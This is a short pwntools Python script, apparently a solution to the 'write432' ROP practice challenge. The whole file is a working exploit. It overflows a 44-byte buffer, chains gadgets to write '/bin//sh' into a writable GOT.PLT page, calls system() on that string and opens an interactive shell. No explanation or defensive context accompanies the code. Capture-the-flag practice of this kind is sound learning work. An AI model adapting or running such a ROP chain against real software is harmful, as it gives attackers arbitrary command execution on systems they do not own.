from pwn import *

buf = ""
buf += "A"*44
buf += p32(0x080486da) # 0x080486da: pop edi; pop ebp; ret; 
buf += p32(0x804a080) # GOT.PLT + 0x80
buf += "/bin"
buf += p32(0x08048670) # 0x08048670: mov dword ptr [edi], ebp; ret; 
buf += p32(0x080486da) # 0x080486da: pop edi; pop ebp; ret; 
buf += p32(0x804a084) # GOT.PLT + 0x84
buf += "//sh"
buf += p32(0x08048670) # 0x08048670: mov dword ptr [edi], ebp; ret; 
buf += p32(0x08048430) # 4 0x08048430  GLOBAL    FUNC system
buf += p32(0xdeadbeef)
buf += p32(0x804a080) # Address of /bin//sh on GOT.PLT memory page


b = process("./write432")
b.recv()
b.sendline(buf)
b.interactive()
